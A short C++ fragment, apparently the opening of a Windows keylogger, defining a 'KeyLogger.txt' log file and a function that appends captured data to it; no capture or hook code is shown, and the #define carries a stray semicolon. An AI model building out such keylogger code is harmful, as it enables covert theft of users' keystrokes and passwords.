#include <iostream>
#include <Windows.h>
#include <fstream>


#define LOG_FILE "KeyLogger.txt";

void SaveData(std::string data) {
	std::fstream logfile;

	logfile.open(LOG_FILE, std::ios::app);

	logfile << data;

}

